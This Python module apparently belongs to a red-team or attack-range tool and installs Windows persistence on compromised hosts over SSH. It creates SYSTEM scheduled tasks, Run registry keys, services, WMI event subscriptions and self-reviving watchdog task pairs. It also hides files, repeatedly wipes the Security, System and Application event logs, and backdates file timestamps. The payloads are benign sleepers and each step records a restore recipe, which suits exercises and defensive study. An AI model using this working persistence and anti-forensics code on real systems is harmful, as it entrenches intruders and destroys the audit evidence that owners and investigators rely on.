"""persist_windows — the Windows mechanics behind `persist`, one handler per family."""

# check_cmd must be ONE double-quote-free line — run.py re-runs it through the legacy
# winexec wrap. Installs verify in the same round trip: the exit code is the proof.

import re

from ..exec import winexec
from .base import Result, can_root

TIMEOUT = 90

SLEEP_CMD_BODY = "ping -n 600 127.0.0.1 >nul"
SLEEP_CMDLINE = winexec.ps("Start-Sleep 600")

# The two Run hives; .DEFAULT because every NEW profile inherits its entry.
HKLM_RUN = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
HKU_DEFAULT_RUN = ("Registry::HKEY_USERS\\.DEFAULT\\Software\\Microsoft"
                   "\\Windows\\CurrentVersion\\Run")

VERIFY_TAIL = "if ($?) { exit 0 } else { exit 1 }"
_WIN_PATH_RE = re.compile(r"([A-Za-z]:\\[\w\\.+@-]{2,})")


def apply(ctx, ip, family, names):
    """Never raises: one bad family cannot poison the rest."""
    fh = ctx.world.foothold(ip)
    if not fh:
        return Result(False, f"persist_windows: no foothold on {ip}")
    if not fh.get("windows"):
        return Result(False, f"persist_windows: {ip} is not a Windows foothold")
    if not _admin(fh):
        return Result(False, f"persist_windows: {family} on {ip} needs an "
                             "Administrator foothold — escalate first")
    handler = FAMILIES.get(family)
    if handler is None:
        return Result(False, f"persist_windows: no such family {family!r} "
                             f"(have {sorted(FAMILIES)})")
    try:
        return handler(ctx, ip, fh, names or {})
    except Exception as exc:
        return Result(False, f"persist_windows {family} on {ip}: "
                             f"{type(exc).__name__}: {exc}")


def _admin(fh):
    return bool(can_root(fh) or str((fh or {}).get("user", "")).lower()
                in ("administrator", "admin"))


def _send(ctx, ip, fh, script, timeout=TIMEOUT):
    return ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                       winexec.ps(script), timeout=timeout,
                       key_path=fh.get("key_path"))


def _why(rc, out, err):
    text = (err or "").strip() or (out or "").strip()
    return f"rc={rc}" + (f": {text[:200]}" if text else "")


def _recorded(ctx, ip, kind, name=None):
    """A repeat run must be ok=True and append no duplicate row; box-side idempotence is the install command's job."""
    for artifact in ctx.world.artifacts(ip):
        if artifact.get("kind") != kind:
            continue
        if name is None or f"id={name}" in (artifact.get("detail") or ""):
            return artifact
    return None


def _done(ctx, ip, kind, name, detail, check_cmd, paths, recipe, note=None):
    """`detail` must end in `id=<name>`: artifact_key derives the per-instance key from it."""
    if note:
        ctx.world.note(ip, note)
    restore = {"recipe": list(recipe), "secrets": None}
    if _recorded(ctx, ip, kind, name) is not None:
        return Result(True, f"{kind} on {ip}: re-asserted (already recorded as "
                            f"{name}) — no duplicate artifact",
                      data={"reasserted": True}, restore=restore)
    return Result(True, detail,
                  artifacts=[{"ip": ip, "kind": kind, "detail": detail,
                              "check_cmd": check_cmd, "paths": list(paths)}],
                  restore=restore)


def _planted_paths(ctx, ip):
    paths = set()
    for artifact in ctx.world.artifacts(ip):
        paths.update(artifact.get("paths") or [])
        paths.update(_WIN_PATH_RE.findall(artifact.get("detail") or ""))
    return sorted(paths)


def _array(paths):
    return ",".join("'" + p + "'" for p in paths)


def _maint_path(names):
    return f"C:\\Windows\\System32\\{names['stem']}-maint.cmd"


def scheduled_task(ctx, ip, fh, names):
    task, script = names["task"], names["script"]
    ps = (f"Set-Content -Path '{script}' -Value '{SLEEP_CMD_BODY}' -Encoding ascii; "
          f"schtasks /Create /TN '{task}' /TR '{script}' "
          "/SC MINUTE /MO 15 /RU SYSTEM /F; "
          f"schtasks /Query /TN '{task}' >$null; {VERIFY_TAIL}")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"scheduled_task on {ip}: {_why(rc, out, err)}")
    detail = f"scheduled task {task} (SYSTEM, every 15 min) runs {script} id={task}"
    return _done(ctx, ip, "persist-scheduled-task", task, detail,
                 f"schtasks /Query /TN '{task}' >$null; {VERIFY_TAIL}",
                 [script],
                 [f"schtasks /Delete /TN '{task}' /F",
                  f"Move-Item -Path '{script}' -Destination '{script}.tlaloc-bak' -Force"])


def defrun(ctx, ip, fh, names):
    """The default hive ships NO Run key and New-ItemProperty refuses a missing parent — hence the New-Item."""
    value = names["run_value"]
    ps = (f"$p = '{HKU_DEFAULT_RUN}'; "
          "New-Item -Path $p -Force | Out-Null; "
          f"New-ItemProperty -Path $p -Name '{value}' -Value '{SLEEP_CMDLINE}' "
          "-PropertyType String -Force | Out-Null; "
          f"$v = (Get-ItemProperty -Path $p -ErrorAction SilentlyContinue).{value}; "
          "if ($v) { exit 0 } else { exit 1 }")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"defrun on {ip}: {_why(rc, out, err)}")
    detail = (f"HKU .DEFAULT Run value {value} (new profiles inherit it) "
              f"id={value}")
    check = (f"if ((Get-ItemProperty '{HKU_DEFAULT_RUN}').{value}) "
             "{ exit 0 } else { exit 1 }")
    return _done(ctx, ip, "persist-defrun", value, detail, check, [],
                 [f"Remove-ItemProperty -Path '{HKU_DEFAULT_RUN}' "
                  f"-Name '{value}' -Force"])


def runkey(ctx, ip, fh, names):
    value = names["run_value"]
    ps = (f"New-ItemProperty -Path '{HKLM_RUN}' -Name '{value}' "
          f"-Value '{SLEEP_CMDLINE}' -PropertyType String -Force | Out-Null; "
          f"$v = (Get-ItemProperty -Path '{HKLM_RUN}' "
          f"-ErrorAction SilentlyContinue).{value}; "
          "if ($v) { exit 0 } else { exit 1 }")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"runkey on {ip}: {_why(rc, out, err)}")
    detail = f"HKLM Run value {value} -> sleeper on logon id={value}"
    check = (f"if ((Get-ItemProperty '{HKLM_RUN}').{value}) "
             "{ exit 0 } else { exit 1 }")
    return _done(ctx, ip, "persist-runkey", value, detail, check, [],
                 [f"Remove-ItemProperty -Path '{HKLM_RUN}' -Name '{value}' -Force"])


def service(ctx, ip, fh, names):
    """sc create fails on an existing service (1073), so re-assert goes through sc config."""
    svc, script = names["service"], names["script"]
    ps = (f"Set-Content -Path '{script}' -Value '{SLEEP_CMD_BODY}' -Encoding ascii; "
          f"if (Get-Service -Name '{svc}' -ErrorAction SilentlyContinue) {{ "
          f"sc.exe config '{svc}' binPath= '{script}' start= auto | Out-Null }} "
          f"else {{ sc.exe create '{svc}' binPath= '{script}' start= auto | Out-Null }}; "
          f"sc.exe start '{svc}' | Out-Null; "
          f"sc.exe query '{svc}' >$null; {VERIFY_TAIL}")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"service on {ip}: {_why(rc, out, err)}")
    detail = f"auto-start service {svc} runs {script} id={svc}"
    check = f"sc.exe query '{svc}' >$null; {VERIFY_TAIL}"
    return _done(ctx, ip, "persist-service", svc, detail, check, [script],
                 [f"sc.exe stop '{svc}'",
                  f"sc.exe delete '{svc}'",
                  f"Move-Item -Path '{script}' -Destination '{script}.tlaloc-bak' -Force"])


def wmisub(ctx, ip, fh, names):
    """WMI instances are keyed Name+Namespace, so Set-WmiInstance re-asserts instead of duplicating."""
    wmi, script = names["wmi"], names["script"]
    ps = (f"Set-Content -Path '{script}' -Value '{SLEEP_CMD_BODY}' -Encoding ascii; "
          "$f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
          f"-Arguments @{{Name='{wmi}';EventNamespace='root\\cimv2';"
          "QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent "
          "WITHIN 300 WHERE TargetInstance ISA Win32_LocalTime'}; "
          "$c = Set-WmiInstance -Namespace root\\subscription "
          "-Class CommandLineEventConsumer -Arguments "
          f"@{{Name='{wmi}';CommandLineTemplate='{script}'}}; "
          "Set-WmiInstance -Namespace root\\subscription "
          "-Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} "
          "| Out-Null; "
          "if (Get-WmiObject -Namespace root\\subscription -Class __EventFilter "
          f"| Where-Object {{ $_.Name -eq '{wmi}' }}) {{ exit 0 }} else {{ exit 1 }}")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"wmisub on {ip}: {_why(rc, out, err)}")
    detail = (f"WMI __EventFilter/CommandLineEventConsumer {wmi} -> {script} "
              f"id={wmi}")
    check = ("Get-WmiObject -Namespace root\\subscription -Class __EventFilter "
             f"| Where-Object {{ $_.Name -eq '{wmi}' }} "
             "| ForEach-Object { exit 0 }; exit 1")
    recipe = [
        "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding "
        f"| Where-Object {{ $_.Consumer -match '{wmi}' }} | Remove-WmiObject",
        "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer "
        f"| Where-Object {{ $_.Name -eq '{wmi}' }} | Remove-WmiObject",
        "Get-WmiObject -Namespace root\\subscription -Class __EventFilter "
        f"| Where-Object {{ $_.Name -eq '{wmi}' }} | Remove-WmiObject",
        f"Move-Item -Path '{script}' -Destination '{script}.tlaloc-bak' -Force",
    ]
    return _done(ctx, ip, "persist-wmisub", wmi, detail, check, [script], recipe)


def watchpair(ctx, ip, fh, names):
    t1, t2 = names["task"], names["log_task"]
    root = f"C:\\ProgramData\\Microsoft\\{names['service']}"
    helper = f"{root}\\{names['stem']}-watch.ps1"
    p1, p2 = f"{root}\\{t1}.exe", f"{root}\\{t2}.exe"

    lines = [
        f"$dir = '{root}'",
        f"$pair = @{{ '{t1}' = '{t1}.exe'; '{t2}' = '{t2}.exe' }}",
        "foreach ($t in @($pair.Keys)) {",
        "  if (-not (Get-ScheduledTask -TaskName $t -ErrorAction Ignore)) {",
        "    $arg = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ' "
        f"+ '{helper}'",
        "    $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arg",
        "    $trg = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) "
        "-RepetitionInterval (New-TimeSpan -Minutes 1) "
        "-RepetitionDuration (New-TimeSpan -Days 3650)",
        "    Register-ScheduledTask -TaskName $t -Action $act -Trigger $trg "
        "-User 'SYSTEM' -RunLevel Highest -Force | Out-Null",
        "  }",
        "}",
        "foreach ($exe in @($pair.Values)) {",
        "  $name = [IO.Path]::GetFileNameWithoutExtension($exe)",
        "  if (-not (Get-Process -Name $name -ErrorAction Ignore)) {",
        "    Start-Process -FilePath (Join-Path $dir $exe) "
        f"-ArgumentList '/c {SLEEP_CMDLINE}' -WindowStyle Hidden",
        "  }",
        "}",
    ]
    body = ",".join("'" + line.replace("'", "''") + "'" for line in lines)

    ps = (f"$d = '{root}'; "
          f"if ((Get-ScheduledTask -TaskName '{t1}' -ErrorAction Ignore) -and "
          f"(Get-ScheduledTask -TaskName '{t2}' -ErrorAction Ignore)) {{ exit 0 }}; "
          "New-Item -ItemType Directory -Force -Path $d | Out-Null; "
          f"Copy-Item -Path $env:ComSpec -Destination '{p1}' -Force; "
          f"Copy-Item -Path $env:ComSpec -Destination '{p2}' -Force; "
          f"$L = @({body}); "
          f"Set-Content -Path '{helper}' -Value $L -Encoding ascii; "
          f"& '{helper}'; "
          f"if ((Get-ScheduledTask -TaskName '{t1}' -ErrorAction Ignore) -and "
          f"(Get-ScheduledTask -TaskName '{t2}' -ErrorAction Ignore)) {{ exit 0 }} "
          "else { exit 1 }")
    rc, out, err = _send(ctx, ip, fh, ps, timeout=120)
    if rc != 0:
        return Result(False, f"watchpair on {ip}: {_why(rc, out, err)}")
    detail = (f"mutual watchdog tasks {t1}/{t2} -> {helper} "
              f"(payloads {p1}, {p2}) id={t1}")
    check = (f"if ((Get-ScheduledTask {t1} -EA 0) -and "
             f"(Get-ScheduledTask {t2} -EA 0)) {{ exit 0 }} else {{ exit 1 }}")
    recipe = [
        f"Unregister-ScheduledTask -TaskName '{t1}' -Confirm:$false; "
        f"Unregister-ScheduledTask -TaskName '{t2}' -Confirm:$false   "
        "# BOTH in one pass: either task alone re-creates the other",
        f"Get-Process -Name {t1},{t2} -ErrorAction SilentlyContinue | Stop-Process -Force",
        f"Move-Item -Path '{root}' -Destination '{root}.tlaloc-bak' -Force",
    ]
    note = (f"watchpair {t1}/{t2}: recovery = unregister BOTH tasks in the same "
            f"pass, stop the payload processes, then move {root} aside "
            "(the helper re-creates whichever task is missing within a minute)")
    return _done(ctx, ip, "persist-watchpair", t1, detail, check,
                 [helper, p1, p2], recipe, note=note)


def hide(ctx, ip, fh, names):
    paths = _planted_paths(ctx, ip)
    if not paths:
        return Result(False, f"hide on {ip}: nothing planted to hide")
    ps = ("$ok = 0; "
          f"foreach ($p in @({_array(paths)})) {{ "
          "if (Test-Path $p) { attrib +h +s $p; "
          "if ((Get-Item $p -Force).Attributes.ToString().Contains('Hidden')) "
          "{ Write-Output ('HIDDEN|' + $p); $ok++ } } }; "
          "if ($ok -gt 0) { exit 0 } else { exit 1 }")
    rc, out, err = _send(ctx, ip, fh, ps)
    hidden = [line.split("|", 1)[1] for line in (out or "").splitlines()
              if line.startswith("HIDDEN|")]
    if rc != 0 or not hidden:
        return Result(False, f"hide on {ip}: {_why(rc, out, err)}")
    detail = (f"attrib +h +s on {len(hidden)} planted file(s): "
              f"{', '.join(hidden)} id=hide-{names['stem']}")
    check = " -and ".join(
        f"(Get-Item '{p}' -Force).Attributes.ToString().Contains('Hidden')"
        for p in hidden)
    check = f"if ({check}) {{ exit 0 }} else {{ exit 1 }}"
    return _done(ctx, ip, "persist-hide", f"hide-{names['stem']}", detail, check,
                 hidden, [f"attrib -h -s {p}" for p in hidden])


def logwipe(ctx, ip, fh, names):
    task, helper = names["log_task"], _maint_path(names)
    body = "wevtutil cl Security & wevtutil cl System & wevtutil cl Application"
    ps = ("wevtutil cl Security; wevtutil cl System; wevtutil cl Application; "
          f"Set-Content -Path '{helper}' -Value '{body}' -Encoding ascii; "
          f"schtasks /Create /TN '{task}' /TR '{helper}' /SC MINUTE /MO 30 "
          "/RU SYSTEM /F; "
          f"schtasks /Query /TN '{task}' >$null; {VERIFY_TAIL}")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"logwipe on {ip}: {_why(rc, out, err)}")
    detail = (f"Security/System/Application cleared; task {task} re-clears every "
              f"30 min via {helper} id={task}")
    check = f"schtasks /Query /TN '{task}' >$null; {VERIFY_TAIL}"
    recipe = [
        f"schtasks /Delete /TN '{task}' /F",
        f"Move-Item -Path '{helper}' -Destination '{helper}.tlaloc-bak' -Force",
        "# the cleared Security/System/Application records are unrecoverable — "
        "restore them from the team's log collector",
    ]
    return _done(ctx, ip, "persist-logwipe", task, detail, check, [helper], recipe)


def timestomp(ctx, ip, fh, names):
    """Pre-stamp ticks are captured in the same round trip, so the restore recipe is exact and locale-proof."""
    paths = _planted_paths(ctx, ip)
    if not paths:
        return Result(False, f"timestomp on {ip}: nothing planted to stamp")
    ps = ("$r = (Get-Item $env:SystemRoot).CreationTime; $n = 0; "
          f"foreach ($p in @({_array(paths)})) {{ "
          "$i = Get-Item -Force $p -ErrorAction SilentlyContinue; "
          "if ($i) { Write-Output ('TS|' + $p + '|' + $i.CreationTime.Ticks "
          "+ '|' + $i.LastWriteTime.Ticks + '|' + $i.LastAccessTime.Ticks); "
          "$i.CreationTime = $r; $i.LastWriteTime = $r; $i.LastAccessTime = $r; "
          "$n++ } }; "
          "if ($n -gt 0) { exit 0 } else { exit 1 }")
    rc, out, err = _send(ctx, ip, fh, ps)
    stamped = []
    for line in (out or "").splitlines():
        if not line.startswith("TS|"):
            continue
        parts = line.split("|")
        if len(parts) == 5:
            stamped.append(parts[1:])
    if rc != 0 or not stamped:
        return Result(False, f"timestomp on {ip}: {_why(rc, out, err)}")
    recipe = []
    for path, created, written, accessed in stamped:
        recipe.append(f"(Get-Item '{path}').CreationTime = [datetime]::new({created})")
        recipe.append(f"(Get-Item '{path}').LastWriteTime = [datetime]::new({written})")
        recipe.append(f"(Get-Item '{path}').LastAccessTime = [datetime]::new({accessed})")
    detail = (f"timestamps matched to the system reference on {len(stamped)} "
              f"planted file(s) id=timestomp-{names['stem']}")
    # the artifact is "no longer looks recently touched": the check is that, not bytes
    check = ("if ("
             + " -and ".join(f"(Get-Item '{p}').LastWriteTime -lt "
                             "(Get-Date).AddDays(-7)" for p, _, _, _ in stamped)
             + ") { exit 0 } else { exit 1 }")
    return _done(ctx, ip, "persist-timestomp", f"timestomp-{names['stem']}",
                 detail, check, [p for p, _, _, _ in stamped], recipe)


def decoy(ctx, ip, fh, names):
    name = names["decoy_service"]
    ps = (f"if (Get-Service -Name '{name}' -ErrorAction SilentlyContinue) {{ "
          f"sc.exe config '{name}' binPath= C:\\Windows\\System32\\cmd.exe "
          "start= auto | Out-Null } "
          f"else {{ sc.exe create '{name}' binPath= C:\\Windows\\System32\\cmd.exe "
          "type= own start= auto | Out-Null }; "
          f"sc.exe description '{name}' Backdoor agent | Out-Null; "
          f"sc.exe start '{name}' | Out-Null; "
          f"sc.exe query '{name}' >$null; {VERIFY_TAIL}")
    rc, out, err = _send(ctx, ip, fh, ps)
    if rc != 0:
        return Result(False, f"decoy on {ip}: {_why(rc, out, err)}")
    detail = f"decoy service {name} (obvious bait implant) id={name}"
    check = f"sc.exe query '{name}' >$null; {VERIFY_TAIL}"
    return _done(ctx, ip, "persist-decoy", name, detail, check, [],
                 [f"sc.exe stop '{name}'",
                  f"sc.exe delete '{name}'"])


# persist.py's auto_order(windows=True) walks this order; the map owns mechanics, persist.py the choice.
FAMILIES = {
    "scheduled_task": scheduled_task,
    "defrun": defrun,
    "runkey": runkey,
    "service": service,
    "wmisub": wmisub,
    "watchpair": watchpair,
    "hide": hide,
    "logwipe": logwipe,
    "timestomp": timestomp,
    "decoy": decoy,
}
